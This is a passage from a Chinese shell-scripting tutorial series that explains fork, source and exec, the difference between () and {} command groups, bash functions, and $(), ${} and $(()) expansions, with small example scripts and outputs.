script</code>是用<code>sub-shell</code>去执行的。<br>从<code>process</code>的概念来看，是<code>parent process</code>产生一个<code>child process</code>去执行，当<code>child</code>结束后，返回<code>parent</code>, 但<code>parent</code>的环境是不会因<code>child</code>的改变而改变的。<br>所谓的环境变量元数很多，如<code>effective id(euid)</code>，<code>variable</code>, <code>working dir</code>等等…<br>其中的<code>working dir($PWD)</code> 正是楼主的疑问所在：<br>当用<code>sub-shell</code>来跑<code>script</code>的话，<code>sub-shell</code>的<code>$pwd</code>会因为<code>cd</code>而变更， 但返回<code>primary shell</code>时，<code>$PWD</code>是不会变更的。</p></blockquote><p>能够了解问题的原因及其原理是很好的，但是如何解决问题，恐怕是我们更应该感兴趣的是吧？</p><p>那好，接下来，再让我们了解一下<code>source</code>命令好了。<br>当你有了<code>fork</code>的概念之后，要理解<code>soruce</code>就不难：</p><p>所谓<code>source</code>，就是让<code>script</code>在当前<code>shell</code>内执行而不是产生一个<code>sub-shell</code>来执行。<br>由于所有执行结果均在当前<code>shell</code>内执行,而不是产生一个<code>sub-shell</code>来执行。</p><p>因此, 只要我们原本单独输入的<code>script</code>命令行，变成<code>source</code>命令的参数，就可轻而易举地解决前面提到的问题了。</p><p>比方说，原本我们是如此执行<code>script</code>的：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./my_script.sh</span></span><br></pre></td></tr></table></figure></p><p>现在改成这样既可：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> ./my_script.sh</span></span><br></pre></td></tr></table></figure></p><p>或者：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> . ./my_script.sh</span></span><br></pre></td></tr></table></figure></p><p>说到这里，我想，各位有兴趣看看<code>/etc</code>底下的众多设定的文件，应该不难理解它们被定义后，如何让其他<code>script</code>读取并继承了吧？</p><p>若然，日后，你有机会写自己的<code>script</code>，应也不难专门指定一个设定的文件以供不同的<code>script</code>一起共用了。</p><p>ok,到这里，若你搞懂<code>fork</code>与<code>source</code>的不同，那接下来再接受一个挑战：</p><blockquote><p>那<code>exec</code>又与<code>source</code>/<code>fork</code>有何不同呢？</p></blockquote><p>哦…要了解<code>exec</code>或许较为复杂，尤其是扯上<code>File Decscriptor</code>的话。<br>不过，简单来说：</p><blockquote><p><code>exec</code> 也是让<code>script</code>在同一个进程上执行，但是原有进程则被结束了。<br>简言之，原有进程能否终止，就是<code>exec</code>与<code>source</code>/<code>fork</code>的最大差异了。</p></blockquote><p>嗯，光是从理论去理解，或许没那么好消化，不如动手实践+思考来得印象深刻哦。</p><p>下面让我们为两个简单的<code>script</code>，分别命名为1.sh以及2.sh</p><p>1.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash </span></span><br><span class="line"></span><br><span class="line">A=B </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"PID for 1.sh before exec/source/fork:$$"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> A</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"1.sh: \$A is <span class="variable">$A</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">        <span class="built_in">exec</span>)</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">"using exec..."</span></span><br><span class="line">                <span class="built_in">exec</span> ./2.sh ;;</span><br><span class="line">        <span class="built_in">source</span>)</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">"using source..."</span></span><br><span class="line">                . ./2.sh ;;</span><br><span class="line">        *)</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">"using fork by default..."</span></span><br><span class="line">                ./2.sh ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"PID for 1.sh after exec/source/fork:$$"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"1.sh: \$A is <span class="variable">$A</span>"</span></span><br></pre></td></tr></table></figure><p>2.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"PID for 2.sh: $$"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"2.sh get \$A=<span class="variable">$A</span> from 1.sh"</span></span><br><span class="line"></span><br><span class="line">A=C</span><br><span class="line"><span class="built_in">export</span> A</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"2.sh: \$A is <span class="variable">$A</span>"</span></span><br></pre></td></tr></table></figure><p>然后分别跑如下参数来观察结果：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./1.sh fork</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./1.sh <span class="built_in">source</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./1.sh <span class="built_in">exec</span></span></span><br></pre></td></tr></table></figure></p><p>好了，别忘了仔细比较输出结果的不同及背后的原因哦。<br>若有疑问，欢迎提出来一起讨论讨论。</p><h2 id="shell十五问之7：-与-差在哪？"><a href="#shell十五问之7：-与-差在哪？" class="headerlink" title="shell十五问之7：()与{}差在哪？"></a>shell十五问之7：()与{}差在哪？</h2><hr><p>嗯，这次轻松一下，不讲太多… ^_^</p><p>先说一下，为何要用<code>()</code>或者<code>{}</code>好了。</p><p>许多时候，我们在<code>shell</code>操作上，需要在一定的条件下执行多个命令，也就是说，要么不执行，要么就全执行，而不是每次依序的判断是否要执行下一个命令。</p><p>或者，要从一些命令执行的先后次序中得到结果，如算术运算的<code>2*(3+4)</code>那样。</p><p>这时候，我们就可以引入<strong>命令群组(command group)</strong>的概念，将许多命令集中处理。</p><p>在<code>shell</code> command line中，一般人或许不太计较<code>()</code>与<code>{}</code>这两对符号的差异。<br>虽然两者都可以将多个命令当作群组处理，但若从技术细节上，却是很不一样的：</p><ul><li><code>()</code> 将command group置于sub-shell(子shell)中去执行，也称nested sub-shell。</li><li><code>{}</code> 则是在同一个shell内完成，也称non-named command group。</li></ul><p>若你对上一章的fork与source的概念还记得的话，那就不难理解两者的差异了。</p><p>要是在command group中扯上变量及其他环境的修改，我们可以根据不同的需求来使用<code>()</code>或<code>{}</code>。<br>通常而言, 若所作的修改是临时的，且不想影响原有或以后的设定，那我们就使用nested sub-shell, 即<code>()</code>;反之，则用non-named command group, 即<code>{}</code>。</p><p>是的，光从command line来看，<code>()</code> 与 <code>{}</code>差别就讲完了，够轻松吧。 ^_^</p><p>然而，这两个meta用在其他command meta或领域中(如Regular Expression)，还是有很多差别的。<br>只是，我不打算再去说明了，留给读者慢慢发掘好了。</p><p>我这里只想补充一个概念，就是function。<br>所谓function，就是用一个名字去命名一个command group, 然后再调用这个名字去执行command group。</p><p>从non-named command group来推断，大概你也可以推测到我要说的是<code>{}</code>了吧？(yes! 你真聪明 ^_^)</p><p>在bash中，function的定义方式有两种：</p><ul><li><p>方式一：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> function_name &#123;</span><br><span class="line">        command1</span><br><span class="line">        command2</span><br><span class="line">        command3</span><br><span class="line">        .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>方式二：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">function_name</span></span> () &#123;</span><br><span class="line">        command1</span><br><span class="line">        command2</span><br><span class="line">        command3</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>用哪一种方式无所谓，只是碰到所定义的名称与现有的命令或者别名冲突的话，方式二或许会失败。<br>但方式二起码可以少打个<code>function</code>这一串英文字符，对懒人来说(如我)，有何乐而不为呢？…^_^</p><p>function在一定程度上来说，也可以称为<strong>函数</strong>，但请不要与传统编程所使用的<strong>函数(library)</strong>搞混了，毕竟两者差异很大。<br>唯一相同的是，我们都可以随时用<strong>已定义的名称</strong>来调用它们。</p><p>若我们在shell操作中，需要不断地重复某些命令，我们首先想到的，或许是将命令写成shell脚本(shell script)。<br>不过，我们也可以写成function, 然后在command line中打上function_name就可当一般的shell script使用了。</p><p>若只是你在shell中定义的function, 除了用<code>unset function_name</code>取消外，一旦你退出shell， function也跟着消失。<br>然而，在script脚本中使用function却有许多好处，除了提高整体script的执行性能外(因为已经载入)，还可以节省许多重复的代码。</p><p>简单而言，若你会将多个命令写成script以供调用的话，那你可以将function看成script中script。… ^_^</p><p>而且通过上一章节介绍的<code>source</code>命令，我们可以自行定义许许多多好用的function，在集中写在特定文件中，然后，在其他的script中用<code>source</code>将它们载入，并反复执行。</p><p>若你是<code>RedHat Linux</code>的使用者，或许，已经猜出 <code>/etc/rc.d/init.d/functions</code>这个文件时啥作用了。 ^_^</p><p>ok，说要轻松点的嘛，那这次就暂时写到这吧。<br>祝大家学习愉快。</p><h2 id="shell十五问之8-与-还有-差在哪？"><a href="#shell十五问之8-与-还有-差在哪？" class="headerlink" title="shell十五问之8: $(())与$()还有${}差在哪？"></a>shell十五问之8: $(())与$()还有${}差在哪？</h2><hr><p>我们上一章介绍了<code>()</code>与<code>{}</code>的不同，这次让我们扩展一下，看看更多的变化：</p><blockquote><p><code>$()</code>与<code>${}</code>又是啥玩意儿呢？</p></blockquote><p>在bash shell中, $()与``(反引号)都是用来做<code>命令替换</code>(<code>command substitution</code>)的。<br>所谓的<strong>命令替换</strong>与我们第五章学过的变量替换差不多，都是用来<strong>重组命令行</strong>;完成 `` 或者$()里面的命令，将其结果替换出来，再重组命令行。</p><p>例如：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> the last sunday is $(date -d <span class="string">"last sunday"</span> +%Y-%m-%d)</span></span><br></pre></td></tr></table></figure></p><p>如此便可方便得到上一个星期天的日期了。^_^</p><p>在操作上， 用$()或``都无所谓,只是我个人比较喜欢用$(),理由是：</p><ul><li><p>``(反引号)很容易与’’(单引号)搞混乱，尤其对初学者来说。有时在一些奇怪的字形显示中，两种符号是一模一样的(只取两点)。当然了有经验的朋友还是一眼就能分辨两者。只是，若能更好的避免混乱，又何乐而不为呢？ ^_^</p></li><li><p>在多次的复合替换中， ``需要额外的转义(escape, )处理，而$()则比较直观。</p></li></ul><p>例如，一个错误的使用的例子：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 `command2 `command3` `</span><br></pre></td></tr></table></figure></p><p>原来的本意是要在command2 `command3` ,先将command3替换出来给command2处理，然后再将command2的处理结果，给command1来处理。<br>然而真正的结果在命令行中却是分成了`command2`与 ``。</p><p>正确的输入应该如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 `command2 \`command3\` `</span><br></pre></td></tr></table></figure></p><p> 要不然换成$()就没有问题了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 $(commmand2 $(command3))</span><br></pre></td></tr></table></figure><p>只要你喜欢，做多少层的替换都没有问题。<br>不过，$()并不是没有弊端的。<br>首先，``基本上可用在所有的unix shell中使用，若写成 shell script，其移植性比较高。<br>而$()并不是每一种shell都能使用，我只能说，若你用bash2的话，肯定没问题… ^_^</p><p>接下来，再让我们看看${}吧。<br>它其实就是用来做变量替换用的啦，一般情况下，$var与${var}并没有啥不一样。<br>但是用${}会比较精准的界定变量名称的范围，<br>比方说:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=B</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$AB</span></span></span><br></pre></td></tr></table></figure></p><p>原本是打算先将$A的结果替换出来，然后在其后补一个字母B；但命令行上，真正的结果却是替换变量名称为AB的值出来。<br>若使用${}就没有问题了：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=B</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$&#123;A&#125;</span>B</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> BB</span></span><br></pre></td></tr></table></figure></p><p>不过，假如你只看到${}只能用来界定变量名称的话，那你就实在太小看bash了。</p><p>为了完整起见，我这里再用一些例子加以说明${}的一些特异功能：<br>假设我们定义了一个变量file为：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/dir1/dir2/dir3/my.file.txt</span><br></pre></td></tr></table></figure></p><p>我们可以用${}分别替换获得不同的值：</p><h3 id="1-shell字符串的非贪婪-最小匹配-左删除"><a href="#1-shell字符串的非贪婪-最小匹配-左删除" class="headerlink" title="1. shell字符串的非贪婪(最小匹配)左删除"></a>1. shell字符串的非贪婪(最小匹配)左删除</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;file<span class="comment">#*/&#125;  #其值为：dir1/dir2/dir3/my.file.txt</span></span></span><br></pre></td></tr></table></figure><p>拿掉第一个<code>/</code>及其左边的字符串，其结果为：<code>dir1/dir2/dir3/my.file.txt</code> 。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;file<span class="comment">#*.&#125;  #其值为：file.txt</span></span></span><br></pre></td></tr></table></figure></p><p>拿掉第一个<code>.</code>及其左边的字符串，其结果为：<code>file.txt</code> 。</p><h3 id="2-shell字符串的贪婪-最大匹配-左删除："><a href="#2-shell字符串的贪婪-最大匹配-左删除：" class="headerlink" title="2. shell字符串的贪婪(最大匹配)左删除："></a>2. shell字符串的贪婪(最大匹配)左删除：</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;file<span class="comment">##*/&#125; #其值为：my.file.txt</span></span></span><br></pre></td></tr></table></figure><p>拿掉最后一个<code>/</code>及其左边的字符串，其结果为：<code>my.file.txt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;file<span class="comment">##*.&#125; #其值为：txt</span></span></span><br></pre></td></tr></table></figure><p>拿掉最后一个<code>.</code>及其左边的字符串，其结果为：<code>txt</code></p><h3 id="3-shell字符串的非贪婪-最小匹配-右删除："><a href="#3-shell字符串的非贪婪-最小匹配-右删除：" class="headerlink" title="3. shell字符串的非贪婪(最小匹配)右删除："></a>3. shell字符串的非贪婪(最小匹配)右删除：</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;file%/*&#125;  <span class="comment">#其值为：/dir1/dir2/dir3</span></span></span><br></pre></td></tr></table></figure><p>拿掉最后一个<code>/</code>及其右边的字符串，其结果为：<code>/dir1/dir2/dir3</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;file%.*&#125;  <span class="comment">#其值为：/dir1/dir2/dir3/my.file</span></span></span><br></pre></td></tr></table></figure><p>拿掉最后一个<code>.</code>及其右边的字符串，其结果为：<code>/dir1/dir2/dir3/my.file</code>。</p><h3 id="4-shell字符串的贪婪-最大匹配-右删除："><a href="#4-shell字符串的贪婪-最大匹配-右删除：" class="headerlink" title="4. shell字符串的贪婪(最大匹配)右删除："></a>4. shell字符串的贪婪(最大匹配)右删除：</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;file%%/*&#125;  <span class="comment">#其值为：其值为空。</span></span></span><br></pre></td></tr></table></figure><p>拿掉第一个<code>/</code>及其右边的字符串，其结果为：空串。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;file%%.*&#125;  <span class="comment">#其值为：/dir1/dir2/dir3/my。</span></span></span><br></pre></td></tr></table></figure><p>拿掉第一个<code>.</code>及其右边的字符串，其结果为：<code>/dir1/dir2/dir3/my</code>。</p><blockquote><p><strong>Tips:</strong></p></blockquote><blockquote><p>记忆方法：</p></blockquote><blockquote><p><code>#</code>是去掉左边(在键盘上<code>#</code>在<code>$</code>的左边);</p></blockquote><blockquote><p><code>%</code>是去掉右边(在键盘上<code>%</code>在<code>$</code>的右边);</p></blockquote><blockquote><p> 单个符号是最小匹配;</p></blockquote><blockquote><p> 两个符号是最大匹配;</p></blockquote><h3 id="5-shell字符串取子串："><a href="#5-shell字符串取子串：" class="headerlink" title="5. shell字符串取子串："></a>5. shell字符串取子串：</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;file:0:5&#125; <span class="comment">#提取最左边的5个字符：/dir1</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file:5:5&#125; <span class="comment">#提取第5个字符及其右边的5个字符:/dir2</span></span></span><br></pre></td></tr></table></figure><p>shell字符串取子串的格式：<code>${s:pos:length}</code>,取字符串s的子串：从pos位置开始的字符(包括该字符)的长度为length的的子串;<br>其中pos为子串的首字符，在s中位置；<br>length为子串的长度;</p><blockquote><p><strong>Note:</strong> 字符串中字符的起始编号为0。</p></blockquote><h3 id="6-shell字符串变量值的替换："><a href="#6-shell字符串变量值的替换：" class="headerlink" title="6. shell字符串变量值的替换："></a>6. shell字符串变量值的替换：</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;file/dir/path&#125;  <span class="comment">#将第一个dir替换为path：/path1/dir2/dir3/my.file.txt</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file//dir/path&#125; <span class="comment">#将全部的dir替换为path：/path1/path2/path3/my.file.txt</span></span></span><br></pre></td></tr></table></figure><p>shell字符串变量值的替换格式：</p><ul><li><p>首次替换：<br><code>${s/src_pattern/dst_pattern}</code> 将字符串s中的第一个src_pattern替换为dst_pattern。</p></li><li><p>全部替换：<br><code>${s//src_pattern/dst_pattern}</code> 将字符串s中的所有出现的src_pattern替换为dst_pattern。</p></li></ul><h3 id="7-还可针对变量的不同状态-没设定、空值、非空值-进行赋值："><a href="#7-还可针对变量的不同状态-没设定、空值、非空值-进行赋值：" class="headerlink" title="7. ${}还可针对变量的不同状态(没设定、空值、非空值)进行赋值："></a>7. ${}还可针对变量的不同状态(没设定、空值、非空值)进行赋值：</h3><hr><ul><li><p><code>${file-my.file.txt}</code> #如果file没有设定，则使用my.file.txt作为返回值,<br>否则返回${file};(空值及非空值时，不作处理。);</p></li><li><p><code>${file:-my.file.txt}</code> #如果file没有设定或者${file}为空值, 均使用my.file.txt作为其返回值，<br>否则，返回${file}.(${file} 为非空值时，不作处理);</p></li><li><p><code>${file+my.file.txt}</code> #如果file已设定(为空值或非空值), 则使用my.file.txt作为其返回值，<br>否则不作处理。(未设定时，不作处理);</p></li><li><p><code>${file:+my.file.txt}</code> #如果${file}为非空值, 则使用my.file.txt作为其返回值，<br>否则，(未设定或者为空值时)不作处理。</p></li><li><p><code>${file=my.file.txt}</code> #如果file为设定，则将file赋值为my.file.txt，同时将${file}作为其返回值；<br>否则，file已设定(为空值或非空值)，则返回${file}。</p></li><li><p><code>${file:=my.file.txt}</code> #如果file未设定或者${file}为空值, 则my.file.txt作为其返回值，同时，将${file}赋值为my.file.txt，<br>否则，(非空值时)不作处理。</p></li><li><p><code>${file?my.file.txt}</code> #如果file没有设定，则将my.file.txt输出至STDERR,<br>否侧，已设定(空值与非空值时)，不作处理。</p></li><li><p><code>${file:?my.file.txt}</code> #若果file未设定或者为空值，则将my.file.txt输出至STDERR，<br>否则，非空值时，不作任何处理。</p></li></ul><blockquote><p><strong>Tips:</strong></p></blockquote><blockquote><p>以上的理解在于，你一定要分清楚，<code>unset</code>与<code>null</code>以及non-null这三种状态的赋值；<br>一般而言，与null有关，若不带<code>:</code>, null不受影响；<br>若带 <code>:</code>, 则连null值也受影响。</p></blockquote><h3 id="8-计算shell字符串变量的长度："><a href="#8-计算shell字符串变量的长度：" class="headerlink" title="8. 计算shell字符串变量的长度："></a>8. 计算shell字符串变量的长度：</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#file&#125;  #其值为27, 因为/dir1/dir2/dir3/my.file.txt刚好为27个字符。</span></span></span><br></pre></td></tr></table></figure><h3 id="9-bash数组-array-的处理方法"><a href="#9-bash数组-array-的处理方法" class="headerlink" title="9. bash数组(array)的处理方法"></a>9. bash数组(array)的处理方法</h3><hr><p>接下来，为大家介绍一下bash的数组(array)的处理方法。<br>一般而言, <code>A=&quot;a b c def&quot;</code>这样的变量只是将<code>$A</code>替换为一个字符串，<br>但是改为 <code>A=(a b c def)</code>,则是将<code>$A</code>定义为数组。</p><h4 id="1-数组替换方法可参考如下方法："><a href="#1-数组替换方法可参考如下方法：" class="headerlink" title="1). 数组替换方法可参考如下方法："></a>1). 数组替换方法可参考如下方法：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;A[@]&#125; <span class="comment">#方法一</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;A[*]&#125; <span class="comment">#方法二</span></span></span><br></pre></td></tr></table></figure><p>以上两种方法均可以得到：a b c def, 即数组的全部元素。</p><h4 id="2-访问数组的成员"><a href="#2-访问数组的成员" class="headerlink" title="2). 访问数组的成员:"></a>2). 访问数组的成员:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;A[0]&#125;</span></span><br></pre></td></tr></table></figure><p>其中，<code>${A[0]}</code>可得到a, 即数组A的第一个元素，而 <code>${A[1]}</code>则为数组A的第二元素，依次类推。</p><h4 id="3-数组的长度："><a href="#3-数组的长度：" class="headerlink" title="3). 数组的长度："></a>3). 数组的长度：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#A[@]&#125; #方法一</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#A[*]&#125; #方法二</span></span></span><br></pre></td></tr></table></figure><p>以上两种方法均可以得到数组的长度: 4, 即数组的所有元素的个数。<br>我们同样可以将该方法应用于数组的成员:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#A[0]&#125; 可以得到：1，即数组A的第一个元素(a)的长度;</span></span></span><br></pre></td></tr></table></figure></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#A[3]&#125; 可以得到：3, 即数组A的第4个元素(def)的长度。</span></span></span><br></pre></td></tr></table></figure><h4 id="4-数组元素的重新赋值："><a href="#4-数组元素的重新赋值：" class="headerlink" title="4). 数组元素的重新赋值："></a>4). 数组元素的重新赋值：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A[3]=xyz</span><br></pre></td></tr></table></figure><p>将数组A的第四个元素重新定义为xyz。</p><blockquote><p><strong>Tips:</strong></p></blockquote><blockquote><p>诸如此类的…</p></blockquote><blockquote><p>能够善用bash的$()与${}可以大大提高及简化shell在变量上的处理能力哦 ^_^</p></blockquote><h3 id="10-作用"><a href="#10-作用" class="headerlink" title="10. $(())作用:"></a>10. $(())作用:</h3><hr><p>好了，最后为大家介绍<code>$(())</code>的用途吧：<br><code>$(())</code>是用来作整数运算的。</p><p>在bash中， <code>$(())</code>的整数运算符号大致有这些：</p><ul><li>+- *  /    #分别为”加、减、乘、除”。</li><li>%            #余数运算,(模数运算)</li><li>&amp; | ^ !      #分别为”AND、OR、XOR、NOT”运算。</li></ul><p>例如：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> a=5; b=7; c=2;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $(( a + b * c ))</span></span><br><span class="line">19</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $(( (a + b)/c ))</span></span><br><span class="line">6</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $(( (a * b) % c ))</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure></p><p>在<code>$(())</code>中的变量名称, 可以在其前面加 <code>$</code>符号来替换，也可以不用，如：<br><code>$(( $a + $b * $c ))</code> 也可以得到19的结果。</p><p>此外，<code>$(())</code>还可作不同进制(如二进制、八进制、十六进制)的运算，只是输出结果均为十进制的。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $(( 16#2a )) #输出结果为：42，(16进制的2a)</span><br></pre></td></tr></table></figure></p><p>以一个实用的例子来看看吧：<br>假如当前的umask是022,那么新建文件的权限即为：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">umask</span> 022</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"obase=8; <span class="variable">$(( 8#666 &amp; (8#777 ^ 8#$(umask)</span>) ))"</span> | bc</span></span><br><span class="line">644</span><br></pre></td></tr></table></figure></p><p>事实上，单纯用<code>(())</code>也可以重定义变量值，或作testing：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=5; ((a++)) #可将$a 重定义为6</span><br><span class="line">a=5; ((a--)) #可将$a 重定义为4</span><br><span class="line">a=5; b=7; ((a&lt; b)) #会得到0 (true)返回值。</span><br></pre></td></tr></table></figure></p><p>常见的用于<code>(())</code>的测试符号有如下这些：</p><table><thead><tr><th>符号</th><th>符号名称</th></tr></thead><tbody><tr><td>&lt;</td><td>小于号</td></tr><tr><td>&gt;</td><td>大于号</td></tr><tr><td>&lt;=</td><td>小于或等于</td></tr><tr><td>&gt;=</td><td>大于或等于</td></tr><tr><td>==</td><td>等于</td></tr><tr><td>!=</td><td>不等于</td></tr></tbody></table><blockquote><p><strong>Note:</strong></p></blockquote><blockquote><p>使用<code>(())</code>作整数测试时，请不要跟<code>[]</code>的整数测试搞混乱了。<br>更多的测试，我们将于第10章为大家介绍。</p></blockquote><p>怎样？ 好玩吧… ^_^ </p><p>ok,这次暂时说这么多。</p><p>上面的介绍，并没有详列每一种可用的状态，更多的，就请读者参考手册文件(man)吧。</p><h2 id="shell十五问之9：-与-差在哪？"><a href="#shell十五问之9：-与-差在哪？" class="headerlink" 